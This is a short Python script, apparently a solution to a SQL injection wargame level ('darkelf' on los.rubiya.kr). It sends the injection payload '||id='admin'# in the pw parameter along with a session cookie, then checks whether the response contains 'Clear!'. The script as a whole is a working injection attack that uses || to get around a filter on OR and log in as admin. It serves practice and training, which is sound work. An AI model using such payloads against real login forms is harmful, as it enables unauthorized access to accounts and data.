from requests import get

url ="https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php"
cookie = {"PHPSESSID":"c0bed5cfkoofgp0l3nfhdr2c89"}
params = {
    "pw":"'||id='admin'#"
}

if get(url,params=params,cookies=cookie).text.find("Clear!") > 0:
    print("[*] Success")
